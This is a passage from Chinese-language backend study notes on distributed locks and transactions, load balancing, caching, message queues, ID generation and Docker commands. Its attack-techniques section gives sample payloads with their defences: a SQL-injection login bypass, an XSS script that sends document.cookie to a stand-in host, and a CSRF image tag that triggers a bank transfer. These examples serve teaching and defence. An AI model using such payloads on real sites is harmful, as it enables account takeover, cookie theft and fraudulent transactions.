- 其他节点监听到该节点被删除，会立刻收到通知，然后再次查询自己创建的节点是不是最小的，如果是最小的，则表示获得了锁。

##### 缺点

- 性能上可能没有缓存高，因为在每次创建锁和释放锁的过程中，都需要动态创建，销毁临时节点来实现锁功能。

### 分布式事务

分布式事务就是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的**分布式系统的不同节点**之上。

简单的说就是一次大的操作由不同的小操作组成，这些小的操作分布在不同的服务器上，且属于不同的应用，分布式事务需要保证这些小操作要么全部成功，要么全部失败。本质上来说，分布式事务就是为了保证不同数据库的数据一致性。

#### CAP原则

CAP原则又称为CAP定理，指的是在一个分布式系统中，web服务无法同时满足以下3个特性：

- 一致性（Consistency）：在分布式系统中数据一更新，所有数据变动都是同步的
- 可用性（Availability）：好的响应性能，每个操作都必须有预期的响应结束
- 分区容错性（Partition Tolerance）：在网络分区的情况下，即使出现单个节点无法使用（即节点间通信失败），系统依然正常对外提供服务。

**单机版的Redis中，牺牲的是A可用性，保证了C一致性和P分区容错性。因为宕掉的一台Master节点无法服务了。**

**Cluster功能的Redis牺牲的是C，保证了A可用性和P分区容错性。因为某个节点宕机，那么会有其他节点顶替上来，保证了A，但是无法保证C了。**

在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此CAP理论实际上是在可用性和一致性之间做权衡。

可用性和一致性往往是冲突的，很难使他们同时满足。在多个节点之间进行数据同步时：

- 为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用行
- 为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致

#### BASE理论

BASE理论是对CAP中的一致性和可用性进行一个权衡的结果，理论的核心思想是：我们无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性。

- 基本可用（Basically Available）
  - 指分布式系统在出现不可预知的故障的时候，允许损失部分可用性（不等价于系统不可用）
- 软状态（Soft State）
  - 和硬状态对应，是指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统的不同节点的数据副本之间进行数据同步的过程存在延时
- 最终一致性（Eventually Consistent）
  - 指的是系统所有的数据副本，经过一段时间的同步之后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要试试保证系统数据的强一致性。

#### 两阶段提交（2PC）

两阶段提交需要有一个协调者，来协调两个操作之间的操作流程。当参与方很多时，逻辑会变得比较复杂。

参与方需要实现两阶段提交协议。

##### 阶段1

- 协调者向所有参与者发送事务内容，询问是否可以提交事务并等待答复
- 各参与者执行事务操作，将undo和redo信息记入日志文件中
- 如果参与者执行成功，给协调者返回yes，否则返回no

##### 阶段2

- 如果协调者收到参与者的失败消息或者超时，直接给每个参与者发送回滚rollback消息，否则发送提交commit消息。

可能遇到的情况：

- 当所有参与者都反馈yes就提交事务
- 当有一个参与者反馈no，回滚事务

##### 问题

- 性能问题：所有参与者在事务提交阶段处于同步阻塞状态，占用系统资源，容易导致性能瓶颈
- 可靠性问题：如果协调者存在单点故障问题，或者出现故障，提供者将一直处于锁定状态
- 数据一致性问题：在第二个阶段中，如果出现协调者和参与者都挂了的情况，有可能导致数据不一致。

##### 优点

- 尽量保证了数据的强一致，适合对数据强一致要求很高的关键领域。

##### 缺点

- 实现复杂，牺牲了可用性，对性能影响大，不适合高并发场景

#### 三阶段提交（3PC）

二阶段提交的改进版本，要解决的是协调者和参与者同时挂的问题，3PC把2PC的准备阶段再次一分为二，变成三阶段提交。

##### 阶段1

- 协调者向所有参与者发出包含事务内容的canCommit请求，询问是否可以提交事务，并等待所有参与者答复。
- 参与者收到canCommit请求，如果认为可以执行事务操作，则反馈yes并进入预备状态，否则反馈no

##### 阶段2

- 如果所有参与者返回yes，协调者预执行事务
  - 协调者向所有参与者发出preCommit请求，进入准备阶段
  - 参与者收到preCommit请求后，执行事务操作，将undo和redo信息记入事务日志中（但不提交事务）
  - 各参与者向协调者反馈ack响应或者no响应，并等待最终指令
- 如果有参与者反馈no，或者等待超时后协调者无法收到所有参与者的反馈，即中断事务
  - 协调者向所有参与者发出abort请求
  - 无论收到协调者的abort请求，或者在等待协调者请求过程中出现超时，参与者都会中断事务

##### 阶段3

- 如果所有参与者均回馈ack响应，执行真正的事务提交
  - 如果协调者处于工作状态，则向所有参与者发出doCommit请求
  - 参与者收到doCommit请求后，会正式执行事务提交，并释放整个事务期间占用的资源
  - 各参与者向协调者反馈ack完成的消息
  - 协调者收到所有参与者反馈的消息后，即完成事务提交
- 如果有参与者反馈no，或者等待超时后协调者无法收到所有参与者的反馈，即回滚事务
  - 如果协调者处于工作状态，则向所有参与者发送rollback请求
  - 参与者使用阶段1中的undo信息执行回滚操作，并释放整个事务期间占用的资源
  - 各参与者向协调者反馈ack完成的消息
  - 协调者收到所有参与者反馈的消息后，即完成回滚操作
- 注意：进入阶段3后，无论协调者是否出问题，或者协调者与参与者网络出现问题，都会导致参与者无法接收到协调者发出的doCommit请求或者abort请求，**此时参与者都在等待超时之后，自动执行事务提交。**

##### 优点：

- 相比二阶段提交，三阶段提交降低了阻塞范围，在等待超时后协调者或参与者会中断事务。避免了协调者单点问题。阶段3中协调者出现问题时，参与者会继续提交事务。

##### 缺点：

- 数据不一致的问题依然存在，当在参与者收到preCommit请求后等待doCommit指令时，此时如果协调者请求中断事务，而协调者无法与参与者正常通信，会导致参与者继续提交事务，造成数据不一致。

#### 补偿事务（TCC）

TCC是服务化的二阶段编程模型，采用的补偿机制。核心思想是：针对每个操作，都要注册一个与其对应的确认和补偿操作。分为三个阶段：

- Try阶段主要是对业务系统做检测和资源预留
  - 完成所有业务检查（一致性）
  - 预留必须业务资源（准隔离性）
  - Try尝试执行业务
- Confirm阶段主要对业务系统做确认提交。
  - Try阶段执行成功并开始执行Confirm阶段时，默认Confirm阶段是不会出错的。即只要Try成功，Confirm一定成功。
- Cancel阶段主要是在业务执行错误，需要回滚的状态下执行的业务取消，预留资源释放。

##### 优点：

- 性能提升：具体业务来实现控制资源锁的粒度变小，不会锁定整个资源
- 数据最终一致性：基于Confirm和Cancel的幂等性，保证事务最终完成确认或者取消，保证数据的一致性
- 可靠性：解决了XA协议的协调者单点故障问题，由主业务发起并控制整个业务活动，业务活动管理器也变成多点，引入集群。

##### 缺点：

- TCC的三个阶段操作功能要按具体业务来实现，业务耦合度较高，提高了开发成本。

## 负载均衡

- 集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点
- 负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上
- 负载均衡器可以用来实现高可用以及伸缩性：
  - 高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用
  - 伸缩性：根据系统整体负载情况，可以很容易的添加或者移除节点
- 负载均衡器运行过程中：根据负载均衡算法得到转发的节点，然后进行转发
- **Nginx主要使用加权轮询、IP哈希、最少连接的方法作为负载均衡算法**

### 负载均衡算法

- 轮询
  - 把每个请求轮流发送到每个服务器上
  - 该算法比较适合每个服务器性能差不多的场景，如果存在性能差异的情况下，那么性能较差的服务器可能无法承担过大的负载
- 加权轮询
  - 在轮询的基础上，根据服务器性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值
- 最少连接
  - 由于每个请求的连接时间不一样，适用轮询或者加权轮询的话，可能导致每台服务器当前连接数过大，而另一台连接过少，造成负载不均衡
  - 最少连接算法是将请求发送到当前最少连接数的服务器上
- 加权最少连接
  - 在最少连接算法的基础上，根据服务器的性能为每台服务器分配权重，在根据权重计算每台服务器能处理的连接数
- 随机算法
  - 随机发送到服务器上
- 源地址哈希法
  - 通过对客户端IP计算哈希值之后，再对服务器数量取模得到目标服务器序号
  - 可以保证同一个IP的客户端请求会转发到同一台服务器上，可以实现会话粘滞（sticky session）

### 转发实现

#### HTTP重定向

HTTP重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的IP地址之后，将该地址写入HTTP重定向报文中，状态码为302。客户端收到重定向报文之后，需要重新向服务器发起请求。

缺点：

- 需要两次请求，因此访问延迟高
- HTTP负载均衡服务器处理能力有限，会限制集群的规模

#### DNS域名解析

在DNS解析域名的同时使用负载均衡算法计算服务器IP地址。

大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。

优点：

- DNS能够根据地理位置进行域名解析，返回离用户最近的服务器IP地址

缺点：

- 由于DNS具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改DNS记录时，需要过很长一段时间才生效

#### 反向代理服务器

反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。

在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。

优点：

- 与其他功能集成在一起，部署简单

缺点：

- 所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。

#### 网络层

在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。

源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。

优点：

- 在内核进程中进行处理，性能比较高。

缺点：

- 和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。

#### 数据链路层

在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。

通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从**而不需要修改 IP 地址就可以进行转发**。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。

这是一种**三角传输模式，被称为直接路由**。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。

这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。

### 集群下的Session管理

一个用户的Session信息如果存储在一个服务器上，那么当负载均衡服务器把用户的下一个请求转发到另一台服务器，由于服务器没有用户的Session信息，那么该用户就需要重新进行登陆等操作。

#### Sticky Session

需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的Session存放在该服务器。

缺点：

- 当服务器宕机时，将丢失服务器上的所有Session

#### Session Replication

在服务器之间进行Session同步操作，每个服务器都有所有用户的Session信息，因此用户可以向任何一个服务器进行请求。

缺点：

- 占用过多内存
- 同步过程占用网络宽带以及服务器处理器时间

#### Session Server

使用一个单独的服务器存储Session数据，可以使用传统的Mysql，也可以使用redis这种内存型数据库。

优点：

- 为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。

缺点：

- 需要实现存取Session的代码

## 缓存

### 缓存特征

#### 命中率

当某个请求能够通过f昂问缓存而得到响应时，称为缓存命中。

缓存命中率越高，缓存的利用率也就越高。

#### 最大空间

缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。

当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。

#### 淘汰策略

- FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。
- LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。
- LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。

### 缓存位置

#### 浏览器

当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。

#### ISP

网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。

#### 反向代理

反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。

#### 本地缓存

使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。

#### 分布式缓存

使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。

相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。

#### 数据库缓存

mysql等数据库管理系统你个具有自己的查询缓存机制来提高查询效率

### CDN

内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。

CDN 主要有以下优点：

- 更快地将数据分发给用户；
- 通过部署多台服务器，从而提高系统整体的带宽性能；
- 多台服务器可以看成是一种冗余机制，从而具有高可用性。

## 攻击技术

### SQL注入

利用一些查询语句的漏洞，将sql语句传递到服务器上的数据库运行非法的SQL语句，主要通过拼接来完成。

例如：

```mysql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
// 另
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
// 那么
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
// 此时
strSQL = "SELECT * FROM users;"
```

#### 防范手段

- 使用参数化查询：预先编译SQL语句函数，可以传入适当参数并且多次执行，由于没有拼接过程，因此可以防止SQL注入的发生。

### XSS跨站脚本攻击

（Cross-Site Scripting，XSS），可以将代码注入到用户浏览的网页上，这种代码包括HTML和JavaScript。当用户浏览此网页时，脚本就会在用户的浏览器上执行。

####  原理

加入在某论坛网站中攻击者发布以下内容

```css
<script>location.href="//domain.com/?c="+document.cookie</script>
```

之后该内容可能会被渲染成以下内容：

```css
<p><script>location.href="//domain.com/?c="+document.cookie</script></p>
```

#### 危害

- 窃取用户的cookie
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

#### 防范手段

- 设置Cookie为HttpOnly，可以防止JavaScript脚本调用，这样就无法通过document.cookie获取用户Cookie信息。
- 过滤特殊字符
  - 例如将`<`转义为`&lt;`，将`>`转义为`&gt;`，从而可以避免HTML和Javascript代码的运行。
  - 富文本编辑器允许用户输入HTML代码，就不能通过简单的转义字符进行过滤了，通常使用XSS filter来防范XSS攻击，通过定义一些标签白名单或者黑名单，从而不允许攻击性的HTML代码的输入。

### CSRF跨站请求伪造

（Cross-site Request Forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（比如发送邮件，发送消息，转账等）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。

#### 原理

假如一家银行用已执行转账操作的URL地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName
```

那么，一个恶意攻击者可以在另一个网站上防止如下代码：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">
```

如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她会损失1000美元。

这种恶意的网址有很多种形式，藏身于网页中的许多地方。此外攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中，这意味着如果服务器没有合适的防御措施的话，用户即使访问熟悉的可信网站也可能有受攻击的危险。

但是攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息，能做到的只是欺骗用户浏览器，让其以用户的名义执行操作。

#### 防范手段

- 验证码：因为CSRF攻击是在用户无意识的情况下发生的，所以要求用户数呼入验证码可以让用户直到自己正在做的操作。
- 添加校验Token：在访问敏感数据请求时，要求用户浏览器提供不存在Cookie中的，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

### DoS攻击

（Denial of Service，DoS），拒绝服务，目的是为了让计算机或者网络无法提供正常的服务。

单一的DoS攻击一般是采用一对一方式的，利用网络协议和操作系统的一些缺陷，采用欺骗和伪装的策略来进行我昂罗攻击，使网站服务器充斥大量要求回复的信息，消耗网络宽带和系统资源，导致网络或者系统不胜负荷以至于瘫痪而停止提供正常的网络服务。

#### DDoS攻击

分布式拒绝服务攻击DDoS是一种基于DoS的特殊形式的拒绝服务攻击，是一种分布式的，协同的大规模攻击方式。与DoS攻击相比，分布式拒绝服务攻击DDoS是借助数百甚至很多台主机发起的集团行为。

#### 攻击方式

- SYN Flood：客户端在短时间内伪造大量不存在的IP地址，向服务器不断地发送SYN包，服务器会根据IP地址回复确认包，并等待客户端的确认，由于源地址是不存在的，服务器需要不断地重发直到超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，甚至会引起系统瘫痪。
  - 防御：
  - cookie源认证：响应的syn_ack上带上特定的sequence numbera。真实的客户端会返回一个sn+1，而伪造的客户端不会做出响应，这样将真实ip加入白名单，下次访问直接通过，其他的进行拦截。
  - TCP首包丢弃，利用了TCP/IP协议的重传特性，来自某个源IP的第一个syn包到达时被直接丢第并记录状态，在该源IP的第2个syn包到达时进行验证，然后放行。
- UDP Flood：属于带宽类攻击，通过向目标服务器发送大量的UDP报文，这种UDP报文通常为大包并且速率非常快，通常会引起：
  - 消耗网络宽带资源，严重时造成链路阻塞；大量变源变端口的UDP Flood会导致依靠会话转发的网络设备性能降低甚至会话耗尽，从而导致网络瘫痪；如果攻击报文到达服务器开放的UDP业务端口，服务器检查报文的正确性需要消耗计算资源，影响正常业务。
  - 防御：
  - 关联TCP服务防范：有些服务比如游戏类服务，先通过TCP协议对用户进行认证，认证通过后使用UDP协议传输业务数据。当收到攻击时，对关联的TCP业务强制启动防御，通过关联防御产生白名单，命中白名单的源的UDP允许通过，否则丢弃。
  - 载荷检查：当UDP流量超过阈值时会触发载荷检查，如果UDP报文数据段内容完全一样，则会被认为是攻击而丢弃报文。

## 消息队列(MQ)

### 消息模型

#### 点对点

消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。

#### 发布/订阅

消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费

#### 观察者模式和发布/订阅模式的区别

- 观察者模式中，观察者和主题都知道对方的存在；而发布/订阅模式中，生产者和消费者不知道对方的存在，他们之间通过频道进行通信。
- 观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布/订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。

### 使用场景

#### 异步处理

发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。

例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。

只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。

#### 流量削峰

在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。

可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。

#### 应用解耦

如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。

通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。

### 可靠性

#### 发送端的可靠性

发送端完成操作后一定能将消息成功发送到消息队列中。

实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。

#### 接收端的可靠性

接收端能够从消息队列成功消费一次消息。

两种实现方法：

- 保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。
- 保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。

## 加密算法

### 对称加密算法

AES，DES，3DES。对称加密算法是指加密和解密采用相同的密钥，是可逆的（即可解密）。

优点：加密速度快

缺点：密钥的传递和保存是一个问题，参与加密和解密的双方使用的密钥是一样的，这样密钥很容易泄露。

### 非对称加密算法

RSA，DSA，ECC。非对称加密算法是指加密和解密采用不同的密钥（公钥和私钥），因此非对称加密也叫公钥加密，是可逆的（即可解密）。公钥密码体制根据其所依据的难题一般分为三类：大素数分解问题类、离散对数问题类、椭圆曲线类。

优点：加密和解密的密钥不一致，公钥是可以公开的，只需要保证私钥不被泄露即可，这样密钥的传递变得简单很多，从而降低了被破解的难度。

缺点：加密速度慢

### 线性散列算法

MD5，SHA1，HMAC。属于单向算法（即不能被解密）。常用在不可还原的密码存储，信息完整性校验等。

典型应用场景是对一段信息产生信息摘要，以防止被篡改。

## 分布式自增ID生成

### UUID

核心思想结合机器的网卡、当地时间、还有一个随机数来生成。`8-4-4-4-12`一共36个字符（32个16进制数字和4个连字符）

#### 优点：

- 性能非常高；本地生成，没有网络消耗

#### 缺点

- 不易于存储：UUID太长，16字节128位，通常以26长度的字符串表示，很多场景下不适用
- 信息不安全：基于MAC地址生成UUID的算法可能造成MAC地址泄露
- ID作为主键时在特定的环境会存在一些问题，比如做DB主键的场景下，UUID非常不合适
  - MySQL官方建议主键越短越好
  - 对于MySQL索引不利，如果作为数据库主键，在InnoDB引擎下，UUID的无序性可能会引起数据位置变动频繁，严重影响性能。

#### 场景

- 可以用来生成如token令牌一类的场景，足够没辨识度，而且无序可读，长度足够。
- 可以用于无纯数字要求、无序自增、无可读性要求的场景。

### 雪花算法

给每台机器分配一个唯一标识，然后通过下面的结构实现全局唯一ID（64位）：`(1bit)+时间戳(41bit)+机器标识(10bit)+自增序列号(12bit)`，这种生成方式，时间毫秒在高位，自增序列在低位，所以一定是递增的。

41bit的时间可以标识大约69年的时间，10bit机器可以分别标识1024台机器。12bit自增序列号可以标识2^12个ID。

#### 优点

- 毫秒数在高位，自增序列在低位，整个ID都是趋势递增的。
- 不依赖数据库等第三方系统，以服务的方式部署，稳定性更高，生成ID的性能也是非常高的。
- 可以根据自身业务特性分配bit位，非常灵活。

#### 缺点

- 强依赖机器时钟，如果机器上时钟回拨，会导致发号重复或者服务会处于不可用状态。

#### 场景

- 雪花算法有很明显的缺点就是时钟依赖，如果确保机器不存在时钟回拨情况的话，那使用这种方式生成分布式ID是可行的，当然小规模系统完全是能够使用的。

### Redis实现

Redis的INCR命令能够将key中存储的数字值增1，这个操作是原子的，所以可以使用它来做分布式ID生成方案，还可以配合其他比如时间戳，机器标识等联合使用。

#### 优点

- 有序递增，可读性强
- 能够满足一定性能

#### 缺点

- 强依赖于Redis，可能存在单点问题
- 占用宽带，而且需要考虑网络延时等问题带来的性能冲击

#### 场景

- 对性能要求不是很高，而且规模较小业务较轻的场景，而且Redis的运行情况有一定要求，注意网络问题和单点压力问题，如果是分布式情况，那考虑的问题就更多了，所以一般情况下不使用这种方式。

### 数据库生成

利用给字段设置`auto_increment_increment`和`auto_increment_offset`来保证ID自增，每次业务可以使用下列SQL读写MySQL得到ID号码

```sql
begin;
REPLACE INTO Tickets64 (stub) VALUES ('a');
SELECT LAST_INSERT_ID();
commit;
```

#### 优点

- 非常简单，利用现有数据库系统的功能实现，成本小，有DBA专业维护。
- ID号单调自增，可以实现一些对ID有特殊要求的业务。

#### 缺点

- 强依赖DB，当DB异常时整个系统不可用，属于致命问题。配置主从复制可以尽可能的增加可用性，但是数据一致性在特殊情况下难以保证。主从切换时的不一致可能会导致重复发号。
- ID发号性能瓶颈限制在单台MySQL的读写性能，如要提高发号能力需要扩充数据库，成本高。

#### 场景

- 小规模的，数据访问量小的业务场景。
- 无高并发场景，插入记录可控的场景。

### Leaf

#### Leaf-segment号段模式

该模式是对直接用数据库自增ID充当分布式ID的一种优化，减少对数据库的频率操作。相当于从数据库批量的获取自增ID，每次从数据库取出一个号段范围，例如(1,1000]代表1000个ID，业务服务将高端在本地生成1-1000的自增ID并加载到内存。

##### Leaf双buffer

服务内部有两个号段缓冲区segment，当当前号段消耗10%时，还没有拿到下一个号段，就会另外启动一个更新线程去更新下一个号段。就是为了保证总是会多缓存两个号段，即使哪一个时刻数据库挂了，也会保证发号服务可以正常工作一段时间。

通常推荐号段长度设置为服务高峰期发号QPS的600倍（10分钟），这样即使DB宕机，leaf也能持续发号10-20分钟不受影响。

##### 优点

- 可以很方便的线性扩容，性能完全能够支撑大多数业务场景
- 容灾性高：leaf服务内部有号段缓存，即使DB宕机，短时间内leaf仍然能正常对外提供服务。

##### 缺点

- ID号码不够随机，能够泄露发号数量的信息，不安全
- 仍然存在DB宕机的风险

#### Leaf-snowflake

基本沿用了snowflake的设计，ID组成结构为`0(正数位)+时间戳(41bit)+机器ID(5bit)+机房ID(5bit)+自增值(12bit)`共64bit Long型。

`Leaf-snowflake`不同于原始snowflake算法地方，主要是在workId的生成上，`Leaf-snowflake`依靠`Zookeeper`生成`workId`，也就是上边的`机器ID`（占5比特）+ `机房ID`（占5比特）。`Leaf`中workId是基于ZooKeeper的`顺序Id`来生成的，每个应用在使用Leaf-snowflake时，启动时都会都在Zookeeper中生成一个顺序Id，相当于一台机器对应一个顺序节点，也就是一个workId。

# Docker

Docker是在容器的基础上，进行了进一步的封装，从文件系统、网络互联到进程隔离等，极大的简化了容器的创建和维护。使得docker技术比虚拟机更为轻便、快捷。

## 与传统虚拟机比较

- 传统虚拟机：虚拟出一套硬件，在其上运行一个完整的操作系统，在该系统上再运行应用程序
- docker：容器内的应用程序直接运行于宿主的内核中，**容器内没有自己的内核**，而且没有进行硬件虚拟；每个容器内都有一个属于自己的文件系统，互不影响。

## Docker优势

- 更高效的利用系统资源：内核级别的虚拟化，可以在一个物理机上运行很多的容器实例
- 更快速的启动速度
- 一致的运行环境
- 持续交付和部署
- 更轻松地迁移
- 更轻松的维护和扩展

## Docker概念

- 镜像（Image）：docker镜像就像一个模板，可以通过这个模板来创建容器服务。通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中）
- 容器（Container）：Docker利用容器技术，独立运行一个或者一个组应用，通过镜像来创建的。具有启动、停止、删除等一些基本命令。可以把容器理解为一个简易的linux系统。
- 仓库（Repository）：仓库就是存放镜像的地方。

![image-20200730172148589](..\assets\post\others\docker.png)

## 底层原理

### Docker是怎么工作的？

Docker 是一个Client-Server结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访问。

Docker相对于VM有更少的抽象层。他利用的是宿主机的内核，VM需要guest OS

![image-20200730104701884](..\assets\post\others\vmdocker.png)

## 常用命令

### 帮助命令

```shell
docker version
docker info		// 显示docker系统信息，包括镜像和容器的数量
docker 命令 --help	// 帮助命令
```

### 镜像命令

```shell
docker images	// 查看主机上的所有镜像
docker search image-name		// 搜索远程仓库镜像
docker pull image-name[:tag]	// 下载远程镜像
docker rmi -f image-name/image-id	// 删除指定镜像
docker rmi -f $(docker images -aq)	// 删除所有镜像
```

### 容器命令

```shell
docker pull image-name			// 新建容器
docker run [可选参数] image		// 启动一个全新的容器
docker run -d --name nginx01 -p 3344:80 nginx
-d	// 后台运行
--name	// 名字
-p	// 外部端口映射，使用主机的3344端口映射到容器内的80端口

docker ps	// 列出运行中的容器
-a			// 列出所有运行过的容器
exit		// 退出容器
ctrl+p+q	// 不停止容器退出
docker attach container-id 	// 进入一个正在运行的容器终端，不会开启一个新的终端 
docker exec -it container-id /bin/bash	// 进入容器并开启一个新的终端

docker start 容器id		// 启动一个停止的容器
docker restart 容器id		// 重启
docker stop 容器id		// 停止当前容器
docker kill 容器id		// 强制停止当前容器
```

### 其他命令

```shell
docker run -d centos		// 后台启动
// docker容器使用后台运行，就必须有一个前台进程，如果没有应用，docker就会自动停止
docker logs					// 查看日志
-tf							// 显示日志
--tail number				// 要显示的日志条数
docker inspect container-id	// 查看容器信息

docker cp container-id:path dstpath
```

## Docker镜像

镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需要的所有内容，包括代码、运行时库、环境变量和配置文件等。

所有的应用，直接打包docker镜像，可以直接跑起来。

### Docker镜像加载原理

- UnionFS（联合文件系统）
  - 一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）
  - Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。
  - 特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层文件和目录。
- Docker镜像加载原理
  - Docker的镜像实际上有一层一层的文件系统组成，这种层级的文件系统UnionFS。
  - bootfs（boot file system）主要包含bootloader和kernel，bootloader主要是引导加载kernel，Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与典型的Linux/Unix系统是一样的，包含bootloader和kernel。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统会卸载bootfs。
  - rootfs（root file system），在bootfs之上，包含的就是典型linux系统中的/dev，/proc，/bin，/etc等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如ubuntu、centos等等。
  - 对于一个精简的OS，rootfs可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用host的kernel，自己只需要提供rootfs就可以了。由此可见对于不同的linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。
- Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层被称为容器层，容器之下的都叫做镜像层。

